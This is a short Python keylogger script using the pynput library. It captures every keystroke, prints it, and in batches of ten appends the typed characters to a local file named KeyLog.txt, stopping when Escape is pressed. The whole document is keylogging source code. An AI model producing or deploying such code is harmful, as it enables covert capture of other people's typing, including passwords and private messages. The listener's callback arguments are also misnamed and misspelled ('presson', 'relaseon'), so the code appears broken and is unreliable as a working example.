from pynput.keyboard import Key, Listener

count = 0
keys = []

def presson(key):
    global count, keys
    count += 1
    print(key)
    keys.append(key)

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("KeyLog.txt", "a", encoding="utf-8") as file:
        for key in keys:

            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)


def relaseon(key):
    if key == Key.esc:
        print("exit")
        return False


with Listener(presson=presson, relaseon=relaseon) as listener:
    listener.join()
